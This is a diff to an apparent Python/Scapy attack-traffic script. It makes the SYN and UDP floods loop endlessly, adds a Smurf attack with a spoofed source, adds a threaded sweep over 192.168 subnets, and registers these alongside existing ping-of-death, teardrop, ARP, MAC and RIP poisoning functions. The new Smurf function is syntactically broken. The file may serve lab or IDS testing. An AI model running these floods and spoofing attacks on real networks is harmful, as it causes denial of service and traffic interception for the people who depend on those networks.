@@ -37,7 +37,7 @@ def NoFlag(ipDestination):
 
 # Denial of Service Attacks #
 def SYNFlood(ipDestination):
-    packet = IP(dst=ipDestination) / TCP(dport=139, flags="S")
+    packet = IP(dst=ipDestination) / TCP(dport=80, flags="S")
     return packet
 def ICMPFlood(ipDestination):
     #With unspoofed address
@@ -62,6 +62,10 @@ def TeardropAttack(ipDestination):
     return packet1, packet2
 def PingOfDeath(ipDestination):
     packet = IP(dst=ipDestination) / ICMP() / ("X" * 65000)
+    return packet
+def Smurf(ipSource, ipDestination):
+    packet = IP(src=ipSource, dst=ipDestination) / ICMP() /
+    "config.LONG_PAYLOAD"
     return packet
 
 # Man in the Middle Attacks
@@ -101,6 +105,15 @@ def RunIPSweep():
 
     #send(packet, inter=0.005)
     return "IPSweep"
+
+def RunIPSweep():
+    for i in range(40, 70):
+        for j in range(0, 56):
+            t=threading.Timer(0.05,subSweep,["192.168."+str(i)+"."+str(j)])
+            t.start()
+        time.sleep(2)
+    return "RunIPSweep"
+
 def RunPortScan(): 
     packet = PortScan(config.targetIPDestination)
     sr(packet, inter=0.005)
@@ -127,7 +140,8 @@ def RunNoFlag():
     return "NoFlag"
 def RunSYNFlood():
     packet = SYNFlood(config.targetIPDestination)
-    send(packet)
+    while True:
+        send(packet)
     return "SYNFlood"
 def RunICMPFlood():
     packet = ICMPFlood(config.targetIPDestination)
@@ -144,7 +158,8 @@ def RunICMPRedirect():
     return "ICMPRedirect"
 def RunUDPFlood():
     packet = UDPFlood(config.targetIPDestination)
-    send(packet)
+    while True:
+        send(packet)
     return "UDPFlood"
 def RunLandAttack():
     packet = LandAttack(config.targetIPDestination)
@@ -169,6 +184,9 @@ def RunARPPoisoning():
     send(packets[1])
     print("complete.")
     return "RunARPPoisoning"
+def RunSmurf():
+    packet = Smurf("192.168.1.1", "192.168.62.60")
+    send(packet) 
 def RunMACFlood():
     packet = MACFlood()
     print(packet)
@@ -232,6 +250,7 @@ def runner(argument, args):
       "16": RunMACFlood,
       "17": RunPortStealing,
       "18": RunRIPPoisoning,
+      "19": RunSmurf,
     }
     func = switcher.get(argument, lambda: "nothing")
     print(func)
